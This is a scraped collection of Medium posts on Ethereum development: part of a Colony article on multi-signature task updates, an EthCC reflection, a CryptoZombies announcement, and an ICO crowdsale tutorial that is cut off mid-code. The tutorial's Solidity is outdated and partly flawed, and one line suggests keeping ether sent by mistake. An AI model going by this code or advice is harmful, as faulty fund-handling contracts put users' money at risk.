_amount) public {    tasks[_id].payouts[EVALUATOR] = _amount;}  function setTaskWorkerPayout(uint256 _id, uint256 _amount) public {    tasks[_id].payouts[WORKER] = _amount;}The four functions above have to check two different pairs of signatures as specified in requirements table above.Additionally, there are many tasks within a colony, and each task will have its own set of users assigned to roles \u2014 so the required signatures should be dynamically retrieved from the task being updated.As I mentioned, gas is expensive. We don\u2019t want users to be constantly sending transactions to the blockchain if they don\u2019t have to. So in this case, the manager creates a transaction locally for the operation that needs to be performed:setTaskBrief(1, \"0x017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232\")which is composed into the following transaction data bytes:0xda4db2490000000000000000000000000000000000000000000000000000000000000001017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232This raw byte data is then signed as a message with the Manager\u2019s key, and through the magic of colonyJS, the signed message can be sent as a JSON object to the Worker, off-chain. The worker may inspect the transaction if necessary to make sure that the raw byte data corresponds to the agreed upon change, and then add their signature to the transaction.When both signatures have been collected, the transaction can be submitted to the blockchain, with all parameters passed as arguments to the executeTaskChange function:function executeTaskChange(uint8[] _sigV,bytes32[] _sigR,bytes32[] _sigS, uint8[] _mode,uint256 _value,bytes _data) public stoppable{   // The full function appears later in this post.}Deconstructing the transactionAs the task change is submitted to the blockchain, the executeTaskChange function then needs a way to pull out the byte data that corresponds to which task is being changed, what the change is, and check it against which signatures are authorized to approve the change.Our solution pulls the relevant information straight from the embedded byte data, using Solidity assembly mload function to read values from EVM memory which is where the input _data parameter is held. On-chain, the deconstructCall method gets the task Id and the signature of the task change function.function deconstructCall(bytes _data) internal pure returns (bytes4 sig, uint256 taskId) {    assembly {      sig := mload(add(_data, 0x20))      taskId := mload(add(_data, 0x24))    }  }Let\u2019s break all that down a bit more!deconstructCall operates on the raw transaction _data bytes. Recall that the manager wants to setTaskBrief on task id 1 with a new work specification. This translates to the following raw transaction:0xda4db2490000000000000000000000000000000000000000000000000000000000000001017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232Using remix, we can inspect the result in EVM memory:0x90: 000000000000000000000000000000440xa0: da4db2490000000000000000000000000xb0: 000000000000000000000000000000000xc0: 00000001017dfd85d4f6cb4dcd715a880xd0: 101f7b1f06cd1e009b2327a0809d01eb0xe0: 9c91f232The transaction data is a dynamic bytes type in Solidity, which is packed tightly in calldata. The first slot (in example above, slot 0x90) represents its length (0x44, or 68 in decimal notation). These 68 bytes comprise 4 bytes for the function signature, 32 bytes for the first function parameter (uint256 taskID), and 32 bytes for the second function parameter (bytes32 specificationHash).So we must add 0x20 (or 32 bytes) to find the start of the actual transaction data value, skipping over the length. The first 4 bytes there hold the function signature we want to call on the task:sig := mload(add(_data, 0x20)) returns da4db249.The taskID is analogous, but it will be located another 32 bytes later in the next memory slot, so we add 0x24:taskId := mload(add(_data, 0x24)) returns the taskID.(Note that here we rely on the taskId to be the first parameter of the function call for updating a task.)Setting the permissionsThe last piece of the puzzle is to get the transaction to go through if and only if the signatures of the correct people are present, and to revert in all other cases.For specifying the reviewer rules we map function signatures to 2 reviewer roles array, e.g. setTaskBrief => [0,2]For simplicity and security we initialize the task update function reviewers in the constructor:// Mapping function signature to 2 task role reviewersmapping (bytes4 => uint8[2]) public reviewers;  constructor() {        setFunctionReviewers(bytes4(keccak256(\"setTaskBrief(uint256,bytes32)\")), MANAGER, WORKER);    setFunctionReviewers(bytes4(keccak256(\"setTaskDueDate(uint256,uint256)\")), MANAGER, WORKER);setFunctionReviewers(bytes4(keccak256(\"setTaskEvaluatorPayout(uint256,uint256)\")), MANAGER, EVALUATOR);        setFunctionReviewers(bytes4(keccak256(\"setTaskWorkerPayout(uint256,uint256)\")), MANAGER, WORKER);}  function setFunctionReviewers(bytes4 _sig, uint8 _firstReviewer, uint8 _secondReviewer)private{  uint8[2] memory _reviewers = [_firstReviewer, _secondReviewer];  reviewers[_sig] = _reviewers;}Putting it together to execute a signed and reviewed task updateWe reroute the public task update functions to be called only internally and expose a single public executeTaskChange function to call them instead, which checks that the the required signatures match those defined in the reviewer rules before executing the change function call.modifier self() {  require(address(this) == msg.sender);  _;}function executeTaskChange(uint8[] _sigV, bytes32[] _sigR, bytes32[] _sigS, uint256 _value, bytes _data)public {  require(_sigR.length == 2);  bytes4 sig;  uint256 taskId;  (sig, taskId) = deconstructCall(_data);bytes32 msgHash = keccak256(abi.encodePacked(address(this),      address(this), _value, _data, taskChangeNonces[taskId]));address[] memory reviewerAddresses = new address[](2);  for (uint i = 0; i < 2; i++)   {     bytes32 txHash;     txHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", msgHash));     reviewerAddresses[i] = ecrecover(txHash, _sigV[i], _sigR[i], _sigS[i]);   }       require(reviewerAddresses[0] != reviewerAddresses[1]);       require(      reviewerAddresses[0] == tasks[taskId].roles[reviewers[sig][0]]      ||      reviewerAddresses[0] == tasks[taskId].roles[reviewers[sig][1]]    );     require(      reviewerAddresses[1] == tasks[taskId].roles[reviewers[sig][0]]          ||      reviewerAddresses[1] == tasks[taskId].roles[reviewers[sig][1]]    );taskChangeNonces[taskId] += 1;   require(executeCall(address(this), _value, _data));}  function executeCall(address to, uint256 value, bytes data)   internal returns (bool success) {   assembly {     success := call(gas, to, value, add(data, 0x20), mload(data), 0, 0)    } }ConclusionThe parameterized transaction review design pattern outlined here provides a viable alternative inspired by the simple multi-sig and taken to a lower level to allow reviewers to be dynamically chosen for a given data type, based on which contract function is called and which item is being modified.For use within a Colony task, three roles are all we need for each of the Manager, Evaluator, and Worker \u2014 but in principle this pattern could be applied to any number of roles and function parameters within a single contract.All this was done in the interest of efficiency and flexibility: We are able to have both a single on-chain transaction and a fine-grained set of parameters for multi-signature operations, without wasting time or (gas) money.If you\u2019re interested in this kind of technical discussion and want to know more about parameterized transaction reviews, please reach out with your questions on Gitter, or post a question in our forums at build.colony.io \u2014 and if you\u2019d like to, contribute to the colonyNetwork.Elena Dimitrova is a Solidity developer.She was a corporate warrior in a previous life, but left her high heels and life in London to go backpacking for a year before falling in love with Ethereum and joining Colony.She now lives in Bulgaria where, while not writing smart contracts or helping in the Truffle Gitter channel, she goes off-roading in her Jeep.Colony is a platform for open organisations.Join the discussion on Discourse, follow us on Twitter, sign up for (occasional) email updates, or if you\u2019re feeling old-skool, drop us an email.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Software Engineering"]}, {"title": "The Buidling Blocks", "post_link": "https://medium.com/balance-io/the-buidling-blocks-5770c698007f?source=search_post", "author_name": "Richard Burton", "author_link": "https://medium.com/@ricburton", "publish_date": "2018-03-13", "last_modified_date": "2018-06-20", "readtime": "1.64", "claps": 360, "voters": 26, "content": "The Buidling BlocksThoughts on EthCCRichard BurtonFollowMar 13, 2018 \u00b7 2 min readLast week I attended the Ethereum Community Conference in Paris. Since then, I have been processing all of the technical presentations, in-depth discussions, late-night debates, and new projects I came across at this incredible event. After some time, my thoughts have started to orbit around a central theme: the buidling blocks for third web are here.EthCC was held at the Conservatoire National des Arts et M\u00e9tiers, ParisI grew up building things on the web we have today. I would write code on my computer and push it to a server that a company controlled. When I stopped paying them, my website would stop working. My customers\u2019 data would be stored on a database that I managed. Everyone had a username and password to log in. This was the way to make things on the web. I was using the tools that were available. It is really tricky to shake off that mental model and think about the web we will have tomorrow. Too often, I find myself wanting to build products with the tools I am used to. Instead, I need to force myself to think about what is going to be possible with this new development stack.Whenever I worry about how slow Ethereum is, I need to dive into Tendermint Consensus, Parity\u2019s Bridges, Counterfactual\u2019s state channels, Plasma Cash, Casper\u2019s shards & Keep\u2019s off-chain computation.Whenever I am too scared to write Solidity, I should check out Truffle\u2019s new debugger, Zeppelin\u2019s work on contract upgrades, Axoni\u2019s work on formal verification for contracts.Whenever I think about storing data on a server, I should try push encrypted files to the networks from Storj, Sia, IPFS & NuCypher.Whenever I think about using a centralised exchange, I should try out AirSwap\u2019s peer-to-peer network, Gnosis\u2019 Dutch Auction and Cosmos peg zones.Whenever I think about building a company, I should experiment with Aragon\u2019s point-and-click DAO-creator and Colony\u2019s work management tools.I stumbled into the Ethereum project in 2015 and helped out with a few interface design concepts before the sale. Despite this early exposure, I still struggle to think about a world where the promises of Web 3 actually come true. The Ethereum Community Conference was a welcome reminder that the buidling blocks are here. Now it is time to #BUIDL.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Web3", "Bitcoin"]}, {"title": "CryptoZombies Lesson 2 Released! Coding Your Own Game on Ethereum", "post_link": "https://medium.com/loom-network/cryptozombies-lesson-2-released-coding-your-own-game-on-ethereum-e23c08c54e39?source=search_post", "author_name": "Matthew Campbell", "author_link": "https://medium.com/@kanwisher", "publish_date": "2017-12-22", "last_modified_date": "2019-08-19", "readtime": "1.05", "claps": 289, "voters": 26, "content": "CryptoZombies Lesson 2 Released! Coding Your Own Game on EthereumMatthew CampbellFollowDec 22, 2017 \u00b7 2 min readLast week we launched Cryptozombies: Interactive Code School for Building Games on Ethereum, and had over 20,000 users try it out in the first week!For those who have been waiting, we\u2019ve finally released lesson 2.Lesson 2 will teach you how to multiply your zombie army by feeding on other lifeforms:And what type of lifeforms do CryptoZombies love to feed on, you ask?Well you\u2019ll have to complete Lesson 2 to find out!But here\u2019s a hint: We\u2019re going to learn how to interact with other smart contracts on the Ethereum blockchain.You may have heard of the contract we\u2019re talking about \ud83d\ude09Anyway, in this Lesson we cover some more advanced Solidity concepts, so it\u2019s highly recommended that you complete Lesson 1 before starting.Check it out: https://cryptozombies.io/and let us know what you think! We always appreciate your feedback.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 0, "tags": ["Ethereum", "Solidity", "Cryptocurrency", "Programming", "Game Development"]}, {"title": "Your Final Guide About Creating Simple and Advanced ICO Smart Contracts", "post_link": "https://medium.com/ethereum-developers/your-final-guide-about-creating-simple-and-advanced-ico-smart-contracts-50a7d363417b?source=search_post", "author_name": "Merunas Grincalaitis", "author_link": "https://medium.com/@merunasgrincalaitis", "publish_date": "2018-08-11", "last_modified_date": "2018-11-05", "readtime": "22.8", "claps": 200, "voters": 26, "content": "Your Final Guide About Creating Simple and Advanced ICO Smart ContractsMerunas GrincalaitisFollowAug 11, 2018 \u00b7 23 min readWhen it comes to token contracts everything is easy. Most of the job is done since lots of companies have developed trusted ERC20 solutions that you can use for your project.However ICO contracts are a whole different story. You could use the ones provided by several different companies but they are harder to implement and are designed in a specific way that may be incompatible with your desired set-up.So my recommendation is to always create your own ICO Smart Contracts from zero. It is harder yet it will show you what\u2019s behind the scenes and how it works. You\u2019ll also be able to modify them and add new features later on for different kinds of ICOs.Before starting I want to warn you that this code may not work in the future since there are lots of changes in Solidity continually so pay close attention to the ideas behind the code and apply them as best as you can.Here\u2019s the index:Preparing the basic structureDeveloping the Crowdsale contractImplementing the new token contract featuresAdvanced ICOs: Variable token pricingConclusion1. Preparing the basic structureThe main thing in an ICO Smart Contract is the buy() function. This is the function that people will use to send Ether in exchange for tokens. It has to accomplish the following:Receive the ETH and store it safely after the calculations have been processedConvert the ETH received to tokens with the appropriate, fixed rateSend the tokens to the userNote that it\u2019s important to distribute the tokens and keep them locked so that the buyers don\u2019t exchange them before the ICO is completed. We\u2019ll implement such feature by the end of this guide.The ICO contract will also have a fallback payable function that will redirect the call to the buy() function as an alternative method for buying tokens directly.The basic structure of the contract will be this:pragma solidity 0.4.24;contract Crowdsale {   function () public payable {      buy();   }   function buy() public payable {   }}To keep things organised I like to add a function to distribute the ether raised to the owner when the ICO is completed with a modifier. Just for security purposes:pragma solidity 0.4.24;contract Crowdsale {   bool icoCompleted;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   function () public payable {      buy();   }   function buy() public payable {   }   function extractEther() public whenIcoCompleted {   }}As you can see I added a modifier called whenIcoCompleted that will allow the execution of the function extractEther() only when the ICO is done. We\u2019ll see when the ICO can be considered completed later on.Any good ICO needs a few essential variables such as:The ICO start time, which can be in timestamp or in block numberThe ICO end timeThe token priceThe token addressThe funding goal in wei which is the smallest Ethereum unitA boolean to define if the ico is already completed or notpragma solidity 0.4.24;contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   address public tokenAddress;   uint256 public fundingGoal;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   function () public payable {      buy();   }   function buy() public payable {   }   function extractEther() public whenIcoCompleted {   }}Now is a good time to add the constructor since we\u2019ll be setting the initial values of those variables immediately when we deploy the contract:constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {   require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);   icoStartTime = _icoStart;   icoEndTime = _icoEnd;   tokenRate = _tokenRate;   tokenAddress = _tokenAddress;   fundingGoal = _fundingGoal;}It\u2019s important that you write your constructor below the modifiers because they are like global functions that you want to find easily in the code.As you can see I just created the basic public constructor where the users will set the values of the important variables. There\u2019s also a require() that checks that all of those values are properly configured.Now that you have the main variables, it\u2019s a good idea to start implementing the function to buy and extract ether. So let\u2019s do that:First the extractEther function. I want you to implement it on your own before continuing to thing about how would you actually do it in a real world situation. Think of this as a small game where the answer is below. There can be lots of different valid answers.This is how I did it:pragma solidity 0.4.24;contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   address public tokenAddress;   uint256 public fundingGoal;   address public owner;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   function () public payable {       buy();   }   constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {      require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);      icoStartTime = _icoStart;      icoEndTime = _icoEnd;      tokenRate = _tokenRate;      tokenAddress = _tokenAddress;      fundingGoal = _fundingGoal;      owner = msg.sender;   }   function buy() public payable {   }   function extractEther() public whenIcoCompleted onlyOwner {       owner.transfer(address(this).balance);   }}Here\u2019s what I did:I simply wanted to extract the ether stored in that Crowdsale contract so I used the global transfer function to transfer the balance of the contract to the owner of it.Because we don\u2019t have an owner yet, I created that variable at the top. Then I set up the value of that to be the msg.sender in the constructor.Finally I created a modifier called onlyOwner that limits the execution of the function extractEther to the owner only. It\u2019s not necessary because the transfer function sends the funds to the owner anyway nevertheless it\u2019s a good practice to keep that option to yourself whenever you want.After that, it\u2019s time to implement the main function. The buy function. This is the function that people will execute when sending ether directly to the contract for buying tokens.This function is big and complex. It handles real money so it\u2019s important that it calculates the tokens correctly. You can try to do it yourself. I\u2019ll show you step by step how to do it.First thing that you want is to calculate how many tokens the user will receive based on the amount of ether sent and the tokenRate that we set earlier in the constructor.Create a variable called tokensToBuy:function buy() public payable {   uint256 tokensToBuy;}That variable will contain how many tokens the user is supposed to receive. How do we know how many tokens to give him?Well, we have access to the msg.value global variable because we are inside a payable function. The msg.value variable contains the number of ether sent when executing that function in wei.So that if a person sends 1 ether, msg.value will be 1000000000000000000 or 1 to the power of 18 because 1 ether is that many wei. Wei is the smallest unit and it\u2019s the one used in all the calculations inside smart contracts.I haven\u2019t said this before but let\u2019s suppose that our token \u201cExample\u201d has 18 decimals, just like ether. This means that 1 token is 1 to the power of 18 ETH or:1 Example = 1e18 Wei of ETHSo to calculate how many tokens the users will get in this case it\u2019s simple. Tokens = msg.value because we have the same number of decimals:function buy() public payable {   uint256 tokensToBuy;   tokensToBuy = msg.value;}That\u2019s easy isn\u2019t it? What if our token has 5 decimals instead of 18? Then the calculations are a bit more complex. Think about this:1 Full Token = 1e5 Pieces of Token1 Full ETH = 1e18 Pieces of ETH or WeiSo to get 1 token we need to do:1 Full token = 1 Full ETH * 1e5 Pieces of Token / 1e18 WeiIn solidity it would look like this:function buy() public payable {   uint256 tokensToBuy;   tokensToBuy = msg.value * 1e5 / 1 ether;}Instead of using 1 Full ETH we are using the actual value sent by the user and we are dividing it by 1 ether which is exactly 1e18 weis inside the contract.The problem with that though is that we are saying \u201cFor each 1 ETH sent you receive only 1 token\u201d, of course with the corresponding decimals conversion so that they are valued the same.That\u2019s not the plan for most ICOs. You want to give something like 1000 tokens for each ETH. That number is exactly our tokenRate variable. So simply multiply it:function buy() public payable {   uint256 tokensToBuy;   tokensToBuy = msg.value * 1e5 / 1 ether * tokenRate;}Now you are getting the exact number of tokens to buy based on the ether received.If you want to reverse the process to get the number of ETH based on the number of tokens and the rate, just make the same calculation the other way:1 Full token = 1e5 Pieces of Token1 Full ETH = 1e18 Wei1 Full ETH = 1 Token * 1e18 Wei / 1e5 Pieces of tokenAdding the token rate it will be:1 Full ETH = 1 Token * 1e18 Wei / 1e5 Pieces of token / TokenRateIn solidity that will be:function unBuy() public payable {   uint256 tokensToConvert = 10; // Sample tokens    uint256 weiFromTokens;   weiFromTokens = tokensToConvert * 1 ether / tokenRate / 1e5;}We may need that later. For now it\u2019s good enough if you understand how it works. Here\u2019s how our ICO contract looks like now:pragma solidity 0.4.24;contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   address public tokenAddress;   uint256 public fundingGoal;   address public owner;   modifier whenIcoCompleted {      require(icoCompleted);       _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   function () public payable {      buy();   }   constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {      require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);      icoStartTime = _icoStart;      icoEndTime = _icoEnd;      tokenRate = _tokenRate;      tokenAddress = _tokenAddress;      fundingGoal = _fundingGoal;      owner = msg.sender;   }   function buy() public payable {      uint256 tokensToBuy;      tokensToBuy = msg.value * 1e5 / 1 ether * tokenRate;   }   function extractEther() public whenIcoCompleted onlyOwner {      owner.transfer(address(this).balance);   }}Instead of writing the decimals with a fixed number like 1e5, you have to get the actual value from the token contract since that value can change during the development of the ICO.We\u2019ll also need the source code of the token contract for distributing the tokens later on. So go ahead and import the token contract like so:pragma solidity 0.4.24;library SafeMath {   function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {      // Gas optimization: this is cheaper than asserting 'a' not being zero, but the      // benefit is lost if 'b' is also tested.      // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522      if (a == 0) {         return 0;      }      c = a * b;        assert(c / a == b);      return c;   }   function div(uint256 a, uint256 b) internal pure returns (uint256) {      // assert(b > 0); // Solidity automatically throws when dividing by 0      // uint256 c = a / b;      // assert(a == b * c + a % b); // There is no case in which this doesn't hold      return a / b;   }   function sub(uint256 a, uint256 b) internal pure returns (uint256) {      assert(b <= a);      return a - b;   }   function add(uint256 a, uint256 b) internal pure returns (uint256 c) {      c = a + b;      assert(c >= a);      return c;   }}contract Token {   using SafeMath for uint256;   event Transfer(address indexed from, address indexed to, uint256 value);   event Approval(address indexed owner, address indexed spender, uint256 value);   mapping(address => uint256) balances;   uint256 totalSupply_;   function totalSupply() public view returns (uint256) {      return totalSupply_;   }   function transfer(address _to, uint256 _value) public returns (bool) {      require(_value <= balances[msg.sender]);      require(_to != address(0));      balances[msg.sender] = balances[msg.sender].sub(_value);      balances[_to] = balances[_to].add(_value);      emit Transfer(msg.sender, _to, _value);      return true;   }   function balanceOf(address _owner) public view returns (uint256) {      return balances[_owner];   }   mapping (address => mapping (address => uint256)) internal allowed;   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {      require(_value <= balances[_from]);      require(_value <= allowed[_from][msg.sender]);      require(_to != address(0));      balances[_from] = balances[_from].sub(_value);      balances[_to] = balances[_to].add(_value);      allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);      emit Transfer(_from, _to, _value);      return true;   }   function approve(address _spender, uint256 _value) public returns (bool) {      allowed[msg.sender][_spender] = _value;      emit Approval(msg.sender, _spender, _value);      return true;   }   function allowance(address _owner,address _spender) public view returns (uint256) {      return allowed[_owner][_spender];   }   function increaseApproval(address _spender, uint256 _addedValue) public returns (bool) {      allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));      emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);         return true;   }   function decreaseApproval(address _spender, uint256 _subtractedValue) public returns (bool) {      uint256 oldValue = allowed[msg.sender][_spender];      if (_subtractedValue >= oldValue) {         allowed[msg.sender][_spender] = 0;      } else {         allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);      }      emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);      return true;   }}contract ICOToken is Token {   string public name = 'ICOToken';   string public symbol = 'ITK';   uint256 public decimals = 18;   constructor () public Token() {      totalSupply_ = 100e24;   }}contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   address public tokenAddress;   uint256 public fundingGoal;   address public owner;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   function () public payable {      buy();   }   constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {      require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);      icoStartTime = _icoStart;      icoEndTime = _icoEnd;      tokenRate = _tokenRate;      tokenAddress = _tokenAddress;      fundingGoal = _fundingGoal;      owner = msg.sender;   }   function buy() public payable {      uint256 tokensToBuy;      tokensToBuy = msg.value * 1e5 / 1 ether * tokenRate;   }   function extractEther() public whenIcoCompleted onlyOwner {      owner.transfer(address(this).balance);   }}Here\u2019s what I did:I imported the SafeMath.sol library to use it with the token for mathematical calculations.Then I added the code of the Token.sol contract that I created by combining the basic, ERC20 and standard token contracts from Open Zeppelin. They provide the best token contracts since they are audited and secure. Used by thousands of projects.Finally I created the contract ICOToken where I define the basic information such as total supply, name, symbol and decimals.Now you can use the token contract inside your ICO contract. This is important because you want to know how many decimals there are for our token and you want to be able to distribute the tokens from that same contract, you\u2019ll have to modify the token contract to distribute the tokens the best way possible but for now let\u2019s continue with the buy function.After adding the token, you want to create an instance of that token in your Crowdsale contract with the address of the token that you\u2019ll be using. Modify the constructor and state variables of the Crowdsale like so:contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   ICOToken public token;      uint256 public fundingGoal;   address public owner;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   function () public payable {      buy();   }   constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {      require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);      icoStartTime = _icoStart;      icoEndTime = _icoEnd;      tokenRate = _tokenRate;      token = ICOToken(_tokenAddress);      fundingGoal = _fundingGoal;      owner = msg.sender;   }   function buy() public payable {      uint256 tokensToBuy;      tokensToBuy = msg.value * 1e5 / 1 ether * tokenRate;   }   function extractEther() public whenIcoCompleted onlyOwner {      owner.transfer(address(this).balance);   }}I made the following changes:Now instead of using the tokenAddress, we\u2019ll be using the token instance which is of the variable type \u201cICOToken\u201d.Then I initialised that token instance in the constructor with the tokenAddress.Now you can interact with that token to get the number of decimals inside the buy function:function buy() public payable {   uint256 tokensToBuy;   tokensToBuy = msg.value * (10 ** token.decimals()) / 1 ether * tokenRate;}This is quite complex so be sure to understand it by reading it twice or three times until it snaps.You are calculating how many tokens the user will get depending on the amount of ETH sent to the buy or fallback function. After that, you have to send those tokens to the person that purchased them. There are different ways to accomplish this.My preferred solution is to create a function inside the token contract that allows the Crowdsale to send tokens to people. Only the Crowdsale contract will be allowed to do that.First you have to change the token contract by adding these 2 functions:contract ICOToken is Token {   string public name = \u2018ICOToken';   string public symbol = \u2018ITK';   uint256 public decimals = 18;   address public crowdsaleAddress;   address public owner;   modifier onlyCrowdsale {      require(msg.sender == crowdsaleAddress);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   constructor () public Token() {      totalSupply_ = 100e24;      owner = msg.sender;   }   function setCrowdsale(address _crowdsaleAddress) public onlyOwner {      require(_crowdsaleAddress != address(0));      crowdsaleAddress = _crowdsaleAddress;   }   function buyTokens(address _receiver, uint256 _amount) public onlyCrowdsale {      require(_receiver != address(0));      require(_amount > 0);      transfer(_receiver, _amount);   }}Here\u2019s what I did:I added the owner and crowdsaleAddress variables.Then I created 2 modifiers, the onlyOwner and the onlyCrowdsale.I modifier the constructor to set the address of the owner.I created the setCrowdale() function which will be used to set the value of the crowdsaleAddress variable.Finally I created the buyTokens() function which will be used to send tokens to people that participate in the ICO. This function is only executable by the Crowdsale contract, that\u2019s why we need the address of it.Note that the transfer() function used inside buyTokens() is the one from the ERC20 standard which means that we have to specify the receiver and the amount of tokens to send. Don\u2019t confuse it with the global transfer() function which has 1 parameter to transfer ether from this contract to another address.Remember to deploy the token and to configure the crowdsale address with the setCrowdsale() function before the ICO to avoid any errors. I like to write the steps in a notepad to remember how to proceed when deploying the ICO and token contracts since such configuration will be needed.The list of steps is essential to avoid errors. It will look like this:Deploy the token contractDeploy the Crowdsale contract using the token address of the contract just deployedSet the Crowdsale address inside the token contract with the setCrowdsale() function to distribute the tokensMake the Crowdsale address public to your investors so that they can send ether to it to buy tokensThere\u2019s also an important issue with all of this. You have to make sure that the tokens are locked until the end of the ICO to stop people from trading the token on exchanges at lower prices while the crowdsale is running.That could scare investors since they will see that the tokens are sold elsewhere at possibly lower prices.We can do that with a couple functions inside the token contract. First create a modifier called afterCrowdsale like so:contract ICOToken is Token {   string public name = 'ICOToken';   string public symbol = 'ITK';   uint256 public decimals = 18;   address public crowdsaleAddress;   address public owner;   uint256 public ICOEndTime;   modifier onlyCrowdsale {      require(msg.sender == crowdsaleAddress);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   modifier afterCrowdsale {      require(now > ICOEndTime || msg.sender == crowdsaleAddress);      _;   }   constructor (uint256 _ICOEndTime) public Token() {      require(_ICOEndTime > 0);      totalSupply_ = 100e24;      owner = msg.sender;      ICOEndTime = _ICOEndTime;   }   function setCrowdsale(address _crowdsaleAddress) public onlyOwner {      require(_crowdsaleAddress != address(0));      crowdsaleAddress = _crowdsaleAddress;   }   function buyTokens(address _receiver, uint256 _amount) public onlyCrowdsale {      require(_receiver != address(0));      require(_amount > 0);      transfer(_receiver, _amount);   }}I created that modifier, added a variable called ICOEndTime and set the value of that in the constructor to be able to change it later. Note that the crowdsale address will be allowed to transfer the tokens which is needed to distribute them during the ICO.With a modified constructor, the deployment sequence will be different:Deploy the token contract with the ICO end timeDeploy the Crowdsale contract using the token address of the contract just deployedSet the Crowdsale address inside the token contract with the setCrowdsale() function to distribute the tokensMake the Crowdsale address public to your investors so that they can send ether to it to buy tokensAfter that you can override the transfer and allowance functions to lock them until the ICO is over:/// @notice Override the functions to not allow token transfers until the end of the ICOfunction transfer(address _to, uint256 _value) public afterCrowdsale returns(bool) {   return super.transfer(_to, _value);}/// @notice Override the functions to not allow token transfers until the end of the ICOfunction transferFrom(address _from, address _to, uint256 _value) public afterCrowdsale returns(bool) {   return super.transferFrom(_from, _to, _value);}/// @notice Override the functions to not allow token transfers until the end of the ICOfunction approve(address _spender, uint256 _value) public afterCrowdsale returns(bool) {   return super.approve(_spender, _value);}/// @notice Override the functions to not allow token transfers until the end of the ICOfunction increaseApproval(address _spender, uint _addedValue) public afterCrowdsale returns(bool success) {   return super.increaseApproval(_spender, _addedValue);}/// @notice Override the functions to not allow token transfers until the end of the ICOfunction decreaseApproval(address _spender, uint _subtractedValue) public afterCrowdsale returns(bool success) {   return super.decreaseApproval(_spender, _subtractedValue);}function emergencyExtract() external onlyOwner {   owner.transfer(address(this).balance);}I also added an emergencyExtract() function to extract the ether stored in this contract in case someone sends ether to it. It would be quite bad to lose that ether forever.Take advantage of the mistakes and keep the money or contact the sender to refund them such amount.This is the final token contract for your reference, remember that you can see the updated code in the github link at the end of the article:contract ICOToken is Token {   string public name = 'ICOToken';   string public symbol = 'ITK';   uint256 public decimals = 18;   address public crowdsaleAddress;   address public owner;   uint256 public ICOEndTime;   modifier onlyCrowdsale {      require(msg.sender == crowdsaleAddress);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   modifier afterCrowdsale {      require(now > ICOEndTime || msg.sender == crowdsaleAddress);      _;   }   constructor (uint256 _ICOEndTime) public Token() {      require(_ICOEndTime > 0);      totalSupply_ = 100e24;      owner = msg.sender;      ICOEndTime = _ICOEndTime;   }   function setCrowdsale(address _crowdsaleAddress) public onlyOwner {      require(_crowdsaleAddress != address(0));      crowdsaleAddress = _crowdsaleAddress;   }   function buyTokens(address _receiver, uint256 _amount) public onlyCrowdsale {      require(_receiver != address(0));      require(_amount > 0);      transfer(_receiver, _amount);   }   /// @notice Override the functions to not allow token transfers until the end of the ICO   function transfer(address _to, uint256 _value) public afterCrowdsale returns(bool) {      return super.transfer(_to, _value);   }   /// @notice Override the functions to not allow token transfers until the end of the ICO   function 